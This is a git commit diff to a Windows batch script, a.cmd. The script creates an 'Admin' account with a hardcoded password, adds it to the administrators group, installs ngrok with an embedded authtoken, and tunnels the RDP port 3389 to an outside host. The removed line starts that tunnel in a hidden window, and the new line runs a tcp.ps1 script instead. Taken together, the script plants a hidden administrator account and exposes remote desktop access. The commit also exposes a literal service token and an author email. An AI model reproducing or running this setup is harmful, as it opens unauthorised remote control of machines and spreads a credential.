1632ec353a51dbb167c7f46a07bbec4e9d711337
Efebey2903 <swatibaljeet0101@gmail.com>
2024-06-14 04:58:49 +0300

    Update a.cmd

--- a.cmd
+++ a.cmd
@@ -2,6 +2,6 @@ net user /add Admin P@ssw0rd!
 net localgroup administrators /add Admin
 choco install ngrok -y
 ngrok config add-authtoken 2dumqfNwOrYeLZWxq5jCHAJvnq2_3SSomQfvvbASdUDZiQMT
-pwsh.exe -command Start-Process -FilePath ngrok.exe -ArgumentList "tcp 3389" -WindowsStyle Hidden -PassThru
+powershell -command tcp.ps1
 sleep 240
 
